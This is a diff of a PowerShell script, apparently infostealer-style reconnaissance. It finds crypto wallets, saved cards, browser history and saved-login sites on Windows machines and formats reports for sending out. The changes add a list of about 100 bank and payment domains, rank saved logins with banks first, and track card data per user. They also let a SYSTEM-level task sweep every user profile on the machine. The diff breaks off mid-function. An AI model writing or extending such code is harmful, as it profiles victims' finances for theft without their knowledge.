@@ -239,6 +239,32 @@ $WALLETS = @{
         '*.wallet', '*.key', 'wallet.dat', '*.keystore', 'keystore', '*.walletdat'
     )
 
+    bank_domains = @(
+        'chase.com', 'bankofamerica.com', 'wellsfargo.com', 'citi.com', 'citibank.com',
+        'capitalone.com', 'usbank.com', 'pnc.com', 'tdbank.com', 'schwab.com',
+        'fidelity.com', 'vanguard.com', 'morganstanley.com', 'goldmansachs.com',
+        'americanexpress.com', 'discover.com', 'synchrony.com', 'allybank.com',
+        'huntington.com', 'regions.com', 'truist.com', 'fifththirdbank.com',
+        'keybank.com', 'citizensbank.com', 'usaa.com', 'navyfederal.org', 'comerica.com',
+        'sofi.com', 'chime.com',
+        'hsbc.com', 'hsbc.co.uk', 'barclays.com', 'barclays.co.uk', 'lloydsbank.com',
+        'natwest.com', 'nationwide.co.uk', 'halifax-online.co.uk', 'santander.com',
+        'santander.co.uk', 'monzo.com', 'starlingbank.com',
+        'deutsche-bank.de', 'deutschebank.com', 'commerzbank.de', 'bnpparibas.com',
+        'societegenerale.com', 'credit-agricole.fr', 'labanquepostale.fr',
+        'banquepopulaire.fr', 'creditmutuel.fr', 'ing.nl', 'ing.de', 'rabobank.nl',
+        'abnamro.nl', 'nordea.com', 'danskebank.com', 'swedbank.com', 'seb.se',
+        'postfinance.ch', 'erstegroup.com', 'otpbank.com', 'raiffeisen.com',
+        'intesasanpaolo.com', 'poste.it',
+        'emiratesnbd.com', 'adcb.com', 'adib.ae', 'dib.ae', 'mashreq.com', 'rakbank.ae',
+        'bankfab.com', 'nbk.com', 'qnb.com', 'riyadbank.com', 'sabb.com',
+        'alrajhibank.com', 'alinma.com', 'alahli.com', 'bsf.com.sa', 'anb.com.sa',
+        'bankmuscat.com', 'kfh.com', 'nbe.com.eg', 'cibegypt.com', 'alexbank.com',
+        'banquemisr.com', 'attijariwafabank.com', 'bankhapoalim.co.il', 'bankleumi.co.il',
+        'paypal.com', 'payoneer.com', 'westernunion.com', 'moneygram.com', 'skrill.com',
+        'neteller.com', 'wise.com', 'revolut.com', 'venmo.com', 'cash.app'
+    )
+
     history_title_keywords = @(
         'wallet', 'metamask', 'binance', 'coinbase', 'kraken', 'uniswap',
         'opensea', 'airdrop', 'seed phrase', 'private key', 'mnemonic'
@@ -349,6 +375,115 @@ function Expand-PathString {
     param([string]$Path)
     if ([string]::IsNullOrWhiteSpace($Path)) { return $Path }
     return [System.Environment]::ExpandEnvironmentVariables($Path)
+}
+
+function Test-SystemContext {
+    <# True when the process runs as NT AUTHORITY\SYSTEM (typical for a scheduled task
+       configured to run "whether user is logged on or not"). #>
+    try {
+        $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+        if ($null -ne $id -and $id.IsSystem) { return $true }
+    } catch { }
+    $up = [string]$env:USERPROFILE
+    if ($up -and $up -like '*\systemprofile') { return $true }
+    $un = [string]$env:USERNAME
+    if ([string]::IsNullOrWhiteSpace($un)) { return $true }
+    if ($un -eq 'SYSTEM' -or $un -eq 'SYSTEM$' -or $un -like 'NT AUTHORITY*') { return $true }
+    return $false
+}
+
+function Test-ProfileContext {
+    <# True when the environment points at one concrete user profile (interactive session
+       or a per-user relaunch such as ScanAllUsers.ps1), so no multi-profile fan-out is
+       needed: the leaf of USERPROFILE matches USERNAME and the profile has an AppData dir. #>
+    $up = [string]$env:USERPROFILE
+    $un = [string]$env:USERNAME
+    if ([string]::IsNullOrWhiteSpace($up) -or [string]::IsNullOrWhiteSpace($un)) { return $false }
+    $trim = ''; $leaf = ''; $parent = ''
+    try {
+        $trim   = ([string]$up).TrimEnd('\', '/')
+        $leaf   = [System.IO.Path]::GetFileName($trim)
+        $parent = [System.IO.Path]::GetDirectoryName($trim)
+    } catch { return $false }
+    if ([string]::IsNullOrWhiteSpace($leaf) -or $leaf -ne $un) { return $false }
+    if ([string]::IsNullOrWhiteSpace($parent)) { return $false }
+    if (-not (Test-Path -LiteralPath (Join-Path $trim 'AppData'))) { return $false }
+    return $true
+}
+
+function Get-RealUserProfiles {
+    <# Real interactive user profile directories under <SystemDrive>\Users (or
+       $env:WM_USERS_ROOT when set - used by the self-tests). Public/template/service
+       profiles and dot-directories are skipped; a profile must contain an AppData dir. #>
+    $root = [string]$env:WM_USERS_ROOT
+    if ([string]::IsNullOrWhiteSpace($root)) {
+        $drive = [string]$env:SystemDrive
+        if ([string]::IsNullOrWhiteSpace($drive)) { $drive = 'C:' }
+        $root = Join-Path $drive '\Users'
+    }
+    if (-not (Test-Path -LiteralPath $root)) { return @() }
+    $skip = @('Public', 'Default', 'Default User', 'All Users', 'DefaultAppPool', 'systemprofile')
+    $out  = New-Object System.Collections.ArrayList
+    foreach ($d in @(Get-ChildItem -LiteralPath $root -Directory -ErrorAction SilentlyContinue)) {
+        $n = [string]$d.Name
+        if ([string]::IsNullOrWhiteSpace($n)) { continue }
+        if ($n.StartsWith('.')) { continue }
+        if ($skip -contains $n) { continue }
+        if (-not (Test-Path -LiteralPath (Join-Path $d.FullName 'AppData'))) { continue }
+        [void]$out.Add($d.FullName)
+    }
+    return @($out)
+}
+
+function Invoke-ForEachProfile {
+    <# Runs $Body once for the current profile. In SYSTEM context it runs $Body once per
+       real user profile on the machine, temporarily redirecting USERPROFILE / APPDATA /
+       LOCALAPPDATA / TEMP / TMP / USERNAME, so the browser data of every user is scanned
+       without any external wrapper script. Environment variables are always restored. #>
+    param([scriptblock]$Body)
+    if (-not $Body) { return }
+
+    if (Test-ProfileContext) { & $Body; return }
+    if (-not (Test-SystemContext)) { & $Body; return }
+
+    $profiles = @(Get-RealUserProfiles)
+    if ($profiles.Count -eq 0) {
+        Write-Log 'SYSTEM context: no real user profiles found under the Users folder; scanning the current environment.' 'WARN'
+        & $Body
+        return
+    }
+
+    Write-Log "SYSTEM context: scanning $($profiles.Count) user profile(s)."
+    $names = @('USERPROFILE', 'APPDATA', 'LOCALAPPDATA', 'TEMP', 'TMP', 'USERNAME')
+    $saved = @{}
+    foreach ($n in $names) { $saved[$n] = [string][Environment]::GetEnvironmentVariable($n) }
+
+    foreach ($p in $profiles) {
+        $user = ''
+        try { $user = [System.IO.Path]::GetFileName(([string]$p).TrimEnd('\', '/')) } catch { }
+        try {
+            $appData   = Join-Path $p 'AppData'
+            $adRoaming = Join-Path $appData 'Roaming'
+            $adLocal   = Join-Path $appData 'Local'
+            $tmp       = Join-Path $adLocal 'Temp'
+            if (-not (Test-Path -LiteralPath $tmp)) { $tmp = [System.IO.Path]::GetTempPath() }
+            [Environment]::SetEnvironmentVariable('USERPROFILE', $p, 'Process')
+            [Environment]::SetEnvironmentVariable('APPDATA', $adRoaming, 'Process')
+            [Environment]::SetEnvironmentVariable('LOCALAPPDATA', $adLocal, 'Process')
+            [Environment]::SetEnvironmentVariable('TEMP', $tmp, 'Process')
+            [Environment]::SetEnvironmentVariable('TMP', $tmp, 'Process')
+            if ($user) { [Environment]::SetEnvironmentVariable('USERNAME', $user, 'Process') }
+            Write-Log "SYSTEM context: scanning profile '$user'..."
+            & $Body
+        } catch {
+            Add-Error "Scan of profile '$user' failed: $($_.Exception.Message)"
+            Write-Log "Scan of profile '$user' failed: $($_.Exception.Message)" 'ERROR'
+        } finally {
+            foreach ($n in $names) {
+                [Environment]::SetEnvironmentVariable($n, [string]$saved[$n], 'Process')
+            }
+        }
+    }
 }
 
 function Add-Error {
@@ -530,6 +665,8 @@ function Initialize-State {
         last_report_ts   = ''
         card_sig         = ''
         login_sigs       = @()
+        card_sigs        = @()
+        history_ts       = @()
         seen             = @()
         daily            = @()
     }
@@ -547,6 +684,8 @@ function Initialize-State {
     $Script:State.daily = [System.Collections.ArrayList]@(@($Script:State.daily) | Where-Object { $_ -and $_.date })
     # Add-Member -Force also creates the property on a state.json written by an older version.
     $Script:State | Add-Member -NotePropertyName login_sigs -NotePropertyValue ([System.Collections.ArrayList]@(@($Script:State.login_sigs) | Where-Object { $_ -and $_.user })) -Force
+    $Script:State | Add-Member -NotePropertyName card_sigs -NotePropertyValue ([System.Collections.ArrayList]@(@($Script:State.card_sigs) | Where-Object { $_ -and $_.user })) -Force
+    $Script:State | Add-Member -NotePropertyName history_ts -NotePropertyValue ([System.Collections.ArrayList]@(@($Script:State.history_ts) | Where-Object { $_ -and $_.user })) -Force
 
     $Script:SeenSet = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::Ordinal)
     foreach ($s in @($Script:State.seen)) {
@@ -966,75 +1105,39 @@ function ConvertFrom-UnixMicros {
 #  9)  Check 1: installed programs (registry) -> desktop wallets
 # =====================================================================
 
-function Get-ProfileUserName {
-    <# Maps a user SID to the profile folder name via the HKLM ProfileList key (best effort). #>
-    param([string]$Sid)
-    try {
-        $pl = Get-ItemProperty -Path ("HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\" + $Sid) -ErrorAction Stop
-        $ip = [string](Get-Prop $pl 'ProfileImagePath' '')
-        if ($ip) { return (Split-Path -Leaf $ip) }
-    } catch { }
-    return $Sid
-}
-
-function Get-UninstallScanTargets {
-    <# Builds the list of Uninstall registry keys to scan.
-       - HKLM covers machine-wide installs (64-bit and 32-bit views).
-       - HKCU covers the currently logged-on user (interactive run).
-       - When the process runs as SYSTEM (scheduled task), HKCU points at the
-       system profile which has NO Uninstall key at all. Instead of failing, we
-       enumerate every real user hive under HKEY_USERS and scan each one, so
-       per-user installed wallets are still found for ALL users of the machine.
-       Keys that simply do not exist are skipped silently (no error entry). #>
-    $targets = New-Object System.Collections.ArrayList
-
-    foreach ($machine in @(
-            'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall',
-            'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
-        )) {
-        if (Test-Path -LiteralPath $machine) { [void]$targets.Add([PSCustomObject]@{ Path = ($machine + '\*'); User = '' }) }
-    }
-
-    $cuKey  = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall'
-    $cuUser = [string]$env:USERNAME
-    if ([string]::IsNullOrWhiteSpace($cuUser)) { $cuUser = [string][System.Environment]::UserName }
-
-    if (Test-Path -LiteralPath $cuKey) {
-        [void]$targets.Add([PSCustomObject]@{ Path = ($cuKey + '\*'); User = $cuUser })
-    } else {
-        Write-Log 'HKCU Uninstall key not present (typical when running as SYSTEM); enumerating per-user hives under HKEY_USERS instead.' 'DEBUG'
-        try {
-            $hives = @(Get-ChildItem -LiteralPath 'Registry::HKEY_USERS' -ErrorAction Stop |
-                Where-Object { $_.PSChildName -match '^S-1-5-21-\d+-\d+-\d+-\d+$' })
-            foreach ($h in $hives) {
-                $sid = [string]$h.PSChildName
-                $u   = Get-ProfileUserName -Sid $sid
-                foreach ($sub in @(
-                        'Software\Microsoft\Windows\CurrentVersion\Uninstall',
-                        'Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
-                    )) {
-                    $k = "Registry::HKEY_USERS\$sid\$sub"
-                    if (Test-Path -LiteralPath $k) { [void]$targets.Add([PSCustomObject]@{ Path = ($k + '\*'); User = $u }) }
-                }
-            }
-        } catch {
-            Write-Log "Could not enumerate HKEY_USERS: $($_.Exception.Message)" 'WARN'
-        }
-    }
-    return @($targets)
-}
-
 function Invoke-InstalledProgramScan {
     Write-Log 'Scanning installed programs (registry)...'
 
     $keywords = @(Get-Prop $Script:Wallets 'desktop_wallets' @())
     if ($keywords.Count -eq 0) { Write-Log 'desktop_wallets list is empty.' 'WARN'; return }
 
+    # Machine-wide entries plus per-user entries from every loaded hive. The previous
+    # HKCU path failed in SYSTEM context (HKCU has no Uninstall key there); HKEY_USERS
+    # is enumerated per SID so hives that cannot be read are skipped instead of alerting.
+    $paths = @(
+        'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
+        'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
+    )
+    try {
+        $hkuSids = @(Get-ChildItem -Path 'Registry::HKEY_USERS' -ErrorAction SilentlyContinue |
+            Where-Object { $_.PSChildName -like 'S-1-5-21-*' })
+        foreach ($sid in $hkuSids) {
+            $paths += ('Registry::HKEY_USERS\' + $sid.PSChildName + '\Software\Microsoft\Windows\CurrentVersion\Uninstall\*')
+        }
+    } catch { }
+
     $scanned = 0
-    foreach ($t in @(Get-UninstallScanTargets)) {
-        $p = $t.Path
+    foreach ($p in $paths) {
         try { $items = @(Get-ItemProperty -Path $p -ErrorAction Stop) }
-        catch { Write-Log "Could not read registry path '$p': $($_.Exception.Message)" 'WARN'; continue }
+        catch {
+            if ($p -like 'Registry::HKEY_USERS*') {
+                # Another user's hive is not readable from this context - skip silently.
+                Write-Log "Skipped registry path '$p' (not readable from this context)." 'DEBUG'
+            } else {
+                Add-Error "Could not read registry path '$p': $($_.Exception.Message)"
+            }
+            continue
+        }
 
         foreach ($it in $items) {
             $scanned++
@@ -1058,13 +1161,12 @@ function Invoke-InstalledProgramScan {
             $msg += "📦 Version: $(ConvertTo-HtmlSafe (Limit-Text $ver 40))"
             $msg += "📅 Install date: $(ConvertTo-HtmlSafe (Limit-Text $date 30))"
             if ($loc) { $msg += "📁 Path: <code>$(ConvertTo-HtmlSafe (Limit-Text $loc 160))</code>" }
-            if ($pub) { $msg += "🏢 Publisher: <code>$(ConvertTo-HtmlSafe (Limit-Text $pub 80))</code>" }
-            if ($t.User) { $msg += "👤 User: <code>$(ConvertTo-HtmlSafe (Limit-Text $t.User 60))</code>" }
+            if ($pub) { $msg += "🏢 Publisher: $(ConvertTo-HtmlSafe (Limit-Text $pub 80))" }
             $msg += "🔎 Keyword: <code>$(ConvertTo-HtmlSafe $kw)</code>"
             $msg += "🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
             $msg += "🕒 Discovered: $((Get-Date).ToString('yyyy-MM-dd HH:mm'))"
 
-            $key = "registry|$($t.User)|$dn|$ver|$loc"
+            $key = "registry|$dn|$ver|$loc"
             $isNew = Register-Finding -Type 'desktop' -Key $key -Label $dn -Message ($msg -join "`n")
             if ($isNew) { Add-DailyCounter -Type 'desktop' }
             Write-Log "Desktop wallet: $dn $ver" 'INFO'
@@ -1419,6 +1521,42 @@ function Get-CategoryMeta {
         'dapp'     { return @{ Order = 3; Icon = '🔵'; Title = 'DApps' } }
         'crypto'   { return @{ Order = 4; Icon = '🟡'; Title = 'Crypto sites' } }
         default    { return @{ Order = 5; Icon = '⚪'; Title = 'Other' } }
+    }
+}
+
+function Get-LoginCategory {
+    <# Classifies a saved-login site: banks/payments first, then crypto wallets,
+       exchanges, dApps, general crypto sites; host-name banking keywords are a
+       last-resort heuristic before falling back to 'other'. #>
+    param([string]$Url)
+    $host_ = Get-UrlHost $Url
+    if ([string]::IsNullOrWhiteSpace($host_)) { return 'other' }
+
+    if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'bank_domains' @())) { return 'bank' }
+    if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'wallet_domains' @())) { return 'wallet' }
+    if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'exchanges_domains' @())) { return 'exchange' }
+    if (Test-DomainMatch -HostName $host_ -Domains @(Get-Prop $Script:Wallets 'dapp_domains' @())) { return 'dapp' }
+    if (Test-CryptoKeyword -Text $host_) { return 'crypto' }
+
+    $low = $host_.ToLowerInvariant()
+    foreach ($bk in @('bank', 'banca', 'banque', 'banc', 'credit', 'crédit',
+                      'insure', 'insurance', 'financial', 'finance', 'virement',
+                      'netbanking', 'ebanking', 'ebank', 'payment')) {
+        if ($low -like ('*' + $bk + '*')) { return 'bank' }
+    }
+    return 'other'
+}
+
+function Get-LoginCategoryMeta {
+    <# Display metadata (icon + title) for the saved-login categories - banks first. #>
+    param([string]$Category)
+    switch ($Category) {
+        'bank'     { return @{ Order = 1; Icon = '🏨'; Title = 'Banks & payments' } }
+        'wallet'   { return @{ Order = 2; Icon = '🟣'; Title = 'Crypto wallets' } }
+        'exchange' { return @{ Order = 3; Icon = '🟠'; Title = 'Exchanges' } }
+        'dapp'     { return @{ Order = 4; Icon = '🔵'; Title = 'DApps' } }
+        'crypto'   { return @{ Order = 5; Icon = '🟡'; Title = 'Crypto sites' } }
+        default    { return @{ Order = 6; Icon = '⚪'; Title = 'Other' } }
     }
 }
 
@@ -1954,19 +2092,21 @@ function Get-LoginSignature {
 }
 
 function Build-LoginReportLines {
-    <# Report of the sites kept in the browsers' password stores. URLs only - no credentials. #>
+    <# Report of the sites kept in the browsers' password stores, grouped and sorted by
+       category: banks/payments first, then crypto wallets, exchanges, dApps, crypto
+       sites, other. URLs only - no credentials. #>
     param([switch]$Full)
-    $lines  = New-Object System.Collections.ArrayList
-    $agg    = @(Get-LoginAggregate)
-    $urls   = @(Get-LoginUniqueUrls)
-    $total  = 0
+    $lines   = New-Object System.Collections.ArrayList
+    $agg     = @(Get-LoginAggregate)
+    $urls    = @(Get-LoginUniqueUrls)
+    $total   = 0
     foreach ($s in @($Script:LoginStats)) { $total += [int]$s.Logins }
-    $ts     = (Get-Date).ToString('yyyy-MM-dd HH:mm')
+    $ts      = (Get-Date).ToString('yyyy-MM-dd HH:mm')
     $maxUrls = [int](Get-Prop (Get-Prop $Script:Cfg 'saved_logins') 'max_urls' 120)
 
     [void]$lines.Add('🔑 <b>Saved logins - site URLs</b>')
-    [void]$lines.Add('━━━━━━━━━━━━━━━━')
-    [void]$lines.Add("🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code> · 👤 $([System.Environment]::UserName)")
+    [void]$lines.Add('━━━━━━━━━━━━━━')
+    [void]$lines.Add("🖻 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code> · 👤 $([System.Environment]::UserName)")
     [void]$lines.Add("🕒 Report time: $ts")
     [void]$lines.Add('🔒 <i>URLs only - no username and no password is read, decrypted, stored or sent.</i>')
 
@@ -1976,35 +2116,90 @@ function Build-LoginReportLines {
         return @($lines)
     }
 
+    # Group the unique URLs per site (host with a leading "www." stripped) and count the
+    # stored logins per site across all browsers/profiles.
+    $sites    = @{}
+    $siteCnts = @{}
+    foreach ($u in $urls) {
+        $h = Get-UrlHost $u
+        if ([string]::IsNullOrWhiteSpace($h)) { $h = ([string]$u).Trim() }
+        $key = $h
+        if ($key.StartsWith('www.')) { $key = $key.Substring(4) }
+        if (-not $sites.ContainsKey($key)) {
+            $sites[$key] = [PSCustomObject]@{
+                Host     = $key
+                Urls     = (New-Object System.Collections.ArrayList)
+                Category = (Get-LoginCategory -Url $u)
+            }
+        }
+        [void]$sites[$key].Urls.Add(([string]$u))
+    }
+    foreach ($s in @($Script:LoginStats)) {
+        foreach ($u in @($s.Urls)) {
+            $t = ([string]$u).Trim()
+            if ([string]::IsNullOrWhiteSpace($t)) { continue }
+            $h = Get-UrlHost $t
+            if ([string]::IsNullOrWhiteSpace($h)) { $h = $t }
+            if ($h.StartsWith('www.')) { $h = $h.Substring(4) }
+            if (-not $siteCnts.ContainsKey($h)) { $siteCnts[$h] = 0 }
+            $siteCnts[$h] = [int]$siteCnts[$h] + 1
+        }
+    }
+
+    $siteList = @($sites.Values)
+    $catOrder = @('bank', 'wallet', 'exchange', 'dapp', 'crypto', 'other')
+    $catNames = @{ bank = 'banks'; wallet = 'wallets'; exchange = 'exchanges'; dapp = 'dApps'; crypto = 'crypto'; other = 'other' }
+
+    $catSummary = New-Object System.Collections.ArrayList
+    foreach ($c in $catOrder) {
+        $n = @($siteList | Where-Object { $_.Category -eq $c }).Count
+        if ($n -gt 0) { [void]$catSummary.Add(("{0}: <b>{1}</b>" -f $catNames[$c], $n)) }
+    }
+
     [void]$lines.Add('')
     [void]$lines.Add("📊 Stored logins: <b>$total</b> · unique sites: <b>$($urls.Count)</b> · profiles: <b>$(@($Script:LoginStats).Count)</b>")
+    if ($catSummary.Count -gt 0) {
+        [void]$lines.Add('')
+        [void]$lines.Add("🗂 Categories: " + ($catSummary -join ' · '))
+    }
     [void]$lines.Add('')
     [void]$lines.Add('🌐 <b>Per browser:</b>')
     foreach ($g in $agg) {
         [void]$lines.Add("   • $(ConvertTo-HtmlSafe $g.Browser): logins <b>$($g.Logins)</b> · profiles $($g.Profiles)")
     }
 
-    [void]$lines.Add('')
-    [void]$lines.Add('━━━━━━━━━━━━━━━━')
-    [void]$lines.Add("🔗 <b>Site URLs from saved passwords</b> - $($urls.Count)")
-    $i = 0
-    foreach ($u in $urls) {
-        if ($i -ge $maxUrls) {
-            $rest = $urls.Count - $maxUrls
-            if ($rest -gt 0) { [void]$lines.Add("   … and $rest more site(s).") }
-            break
+    $shown     = 0
+    $truncated = $false
+    foreach ($c in $catOrder) {
+        $inCat = @($siteList | Where-Object { $_.Category -eq $c } | Sort-Object -Property @{ Expression = { @($_.Urls).Count }; Descending = $true }, @{ Expression = { $_.Host } })
+        if ($inCat.Count -eq 0) { continue }
+        $meta = Get-LoginCategoryMeta $c
+        [void]$lines.Add('')
+        [void]$lines.Add('━━━━━━━━━━━━━━')
+        [void]$lines.Add("$($meta.Icon) <b>$($meta.Title)</b> - $($inCat.Count) site(s)")
+        foreach ($site in $inCat) {
+            if ($shown -ge $maxUrls) { $truncated = $true; break }
+            $cnt = 0
+            if ($siteCnts.ContainsKey($site.Host)) { $cnt = [int]$siteCnts[$site.Host] }
+            [void]$lines.Add("   • $(ConvertTo-HtmlSafe $site.Host) — <b>$cnt</b> login(s)")
+            $n = 0
+            foreach ($su in @($site.Urls)) {
+                if ($n -ge 2 -or $shown -ge $maxUrls) { break }
+                [void]$lines.Add("      🔗 <code>$(ConvertTo-HtmlSafe (Limit-Text $su 160))</code>")
+                $n++
+                $shown++
+            }
         }
-        $i++
-        $h = Get-UrlHost $u
-        if ([string]::IsNullOrWhiteSpace($h)) { $h = $u }
-        [void]$lines.Add("$i) $(ConvertTo-HtmlSafe $h)")
-        [void]$lines.Add("   🔗 <code>$(ConvertTo-HtmlSafe (Limit-Text $u 160))</code>")
+        if ($truncated) { break }
+    }
+    if ($truncated) {
+        [void]$lines.Add('   … listing truncated (saved_logins.max_urls reached) - the full list is in the log.')
     }
 
     if ($Full) {
         foreach ($g in $agg) {
             [void]$lines.Add('')
-            [void]$lines.Add('━━━━━━━━━━━━━━━━')
+            [void]$lines.Add('━━━━━━━━━━━━━━')
             [void]$lines.Add("🌐 <b>$(ConvertTo-HtmlSafe $g.Browser)</b> - profile details")
             foreach ($s in @($Script:LoginStats | Where-Object { $_.Browser -eq $g.Browser })) {
                 [void]$lines.Add("   • $(ConvertTo-HtmlSafe $s.Profile): logins $($s.Logins) · $($s.Source)")
@@ -2013,7 +2208,7 @@ function Build-LoginReportLines {
     }
 
     [void]$lines.Add('')
-    [void]$lines.Add('━━━━━━━━━━━━━━━━')
+    [void]$lines.Add('━━━━━━━━━━━━━━')
     [void]$lines.Add('ℹ️ <i>Chromium (Chrome/Edge/Brave/Vivaldi/Opera/Chromium): only the origin_url column of the logins table is read.')
     [void]$lines.Add('Firefox: only the hostname keys of logins.json are read. Password values, usernames and encrypted blobs are never read, decrypted or stored.</i>')
     return @($lines)
@@ -2417,6 +2612,10 @@ function Build-HistoryReportLines {
 function Send-HistoryReport {
     param([switch]$Force)
 
+    # Per-user reporting interval: each scanned profile keeps its own timestamp.
+    $uNow = [string]$env:USERNAME
+    if ([string]::IsNullOrWhiteSpace($uNow)) { $uNow = '(unknown)' }
+
     $reportCfg = Get-Prop (Get-Prop $Script:Cfg 'browser_history') 'report' @{}
     $mode      = [string](Get-Prop $reportCfg 'mode' 'always')
     $minHours  = [int](Get-Prop $reportCfg 'min_hours_between_reports' 6)
@@ -2425,7 +2624,9 @@ function Send-HistoryReport {
     if (-not $Force) {
         if (@($Script:HistoryHits).Count -eq 0) { Write-Log 'No history entries to send in a report.' 'DEBUG'; return }
 
-        $last = [string]$Script:State.last_report_ts
+        $last = ''
+        foreach ($te in @($Script:State.history_ts)) { if ([string]$te.user -eq $uNow) { $last = [string]$te.ts; break } }
+        if (-not $last) { $last = [string]$Script:State.last_report_ts }
         if ($last) {
             $dt = $null
             try { $dt = [datetime]::Parse($last) } catch { $dt = $null }
@@ -2457,7 +2658,12 @@ function Send-HistoryReport {
         if (-not $ok) { $sentAll = $false }
     }
     if ($sentAll) {
-        $Script:State.last_report_ts = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
+        $nowTxt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
+        $Script:State.last_report_ts = $nowTxt
+        $tsArr = New-Object System.Collections.ArrayList
+        foreach ($te in @($Script:State.history_ts)) { if ([string]$te.user -ne $uNow) { [void]$tsArr.Add($te) } }
+        [void]$tsArr.Add([PSCustomObject]@{ user = $uNow; ts = $nowTxt })
+        $Script:State.history_ts = $tsArr
         Write-Log "History report sent ($total message(s))."
     } else {
         Write-Log 'Failed to send part of the history report.' 'ERROR'
@@ -2712,77 +2918,98 @@ function Invoke-FullScan {
         catch { Add-Error "Installed-programs scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
     }
 
-    if ([bool](Get-Prop $scanCfg 'browser_extensions' $true)) {
-        try { Invoke-BrowserExtensionScan }
-        catch { Add-Error "Browser-extension scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
-    }
-
-    if ([bool](Get-Prop $scanCfg 'browser_history' $true)) {
-        try { Invoke-BrowserHistoryScan }
-        catch { Add-Error "Browser-history scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
-    }
-
-    if ([bool](Get-Prop $scanCfg 'filesystem' $true)) {
-        try { Invoke-FileSystemScan }
-        catch { Add-Error "Filesystem scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
-    }
-
-    if ([bool](Get-Prop $scanCfg 'credit_cards' $true)) {
-        try {
-            Invoke-BrowserCardScan
-            $ccCfg = Get-Prop $Script:Cfg 'credit_cards' $null
-            if ([bool](Get-Prop $ccCfg 'notify_on_change' $true)) {
-                $sig  = Get-CardSignature
-                $prev = [string]$Script:State.card_sig
-                # The first run records the fingerprint silently; notification only when the counts/CVV linkage change.
-                if ($prev -and $prev -ne $sig) {
-                    $msg = (Build-CardReportLines -Full) -join "`n"
-                    [void]$Script:NewItems.Add([PSCustomObject]@{ Type = 'card'; Key = "card|$sig"; Label = 'Saved cards (changed)'; Message = $msg })
-                }
-                $Script:State.card_sig = $sig
-            }
-        } catch {
-            Add-Error "Card scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR'
+    # The remaining checks run per user profile: exactly once in a normal user session
+    # (or a ScanAllUsers-style per-user relaunch), and once for every real user profile
+    # when the task runs as SYSTEM. Fingerprints are stored per user so a change in one
+    # profile never masks or fakes a change in another.
+    $Script:CycleNewTotal = 0
+    Invoke-ForEachProfile {
+        if ([bool](Get-Prop $scanCfg 'browser_extensions' $true)) {
+            try { Invoke-BrowserExtensionScan }
+            catch { Add-Error "Browser-extension scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
         }
-    }
 
-    if ([bool](Get-Prop $scanCfg 'saved_logins' $true)) {
-        try {
-            Invoke-BrowserLoginScan
-            $lgCfg = Get-Prop $Script:Cfg 'saved_logins' $null
-            if ([bool](Get-Prop $lgCfg 'notify_on_change' $true)) {
-                $lsig  = Get-LoginSignature
-                # The scheduled task scans each user profile in its own process, so the fingerprint is
-                # kept per user; otherwise one profile would overwrite the next and cause false alerts.
-                $uNow  = [string]$env:USERNAME
-                if ([string]::IsNullOrWhiteSpace($uNow)) { $uNow = '(unknown)' }
-                $sigArr = [System.Collections.ArrayList]@($Script:State.login_sigs)
-                $lprev = ''
-                foreach ($le in $sigArr) { if ([string]$le.user -eq $uNow) { $lprev = [string]$le.sig; break } }
-                # The first run for a profile records the fingerprint silently; notification only when the set of sites changes.
-                if ($lprev -and $lprev -ne $lsig) {
-                    $lmsg = (Build-LoginReportLines -Full) -join "`n"
-                    [void]$Script:NewItems.Add([PSCustomObject]@{ Type = 'login'; Key = "login|$lsig"; Label = 'Saved logins (changed)'; Message = $lmsg })
-                }
-                $newArr = New-Object System.Collections.ArrayList
-                foreach ($le in $sigArr) { if ([string]$le.user -ne $uNow) { [void]$newArr.Add($le) } }
-                [void]$newArr.Add([PSCustomObject]@{ user = $uNow; sig = $lsig })
-                $Script:State.login_sigs = $newArr
-            }
-        } catch {
-            Add-Error "Login scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR'
+        if ([bool](Get-Prop $scanCfg 'browser_history' $true)) {
+            try { Invoke-BrowserHistoryScan }
+            catch { Add-Error "Browser-history scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
         }
+
+        if ([bool](Get-Prop $scanCfg 'filesystem' $true)) {
+            try { Invoke-FileSystemScan }
+            catch { Add-Error "Filesystem scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
+        }
+
+        if ([bool](Get-Prop $scanCfg 'credit_cards' $true)) {
+            try {
+                Invoke-BrowserCardScan
+                $ccCfg = Get-Prop $Script:Cfg 'credit_cards' $null
+                if ([bool](Get-Prop $ccCfg 'notify_on_change' $true)) {
+                    $sig  = Get-CardSignature
+                    # The fingerprint is kept per user profile; otherwise one profile would
+                    # overwrite the next in SYSTEM multi-profile scans and cause false alerts.
+                    $uNow = [string]$env:USERNAME
+                    if ([string]::IsNullOrWhiteSpace($uNow)) { $uNow = '(unknown)' }
+                    $prev = ''
+                    foreach ($ce in @($Script:State.card_sigs)) { if ([string]$ce.user -eq $uNow) { $prev = [string]$ce.sig; break } }
+                    # The first run for a profile records the fingerprint silently; notification only when the counts/CVV linkage change.
+                    if ($prev -and $prev -ne $sig) {
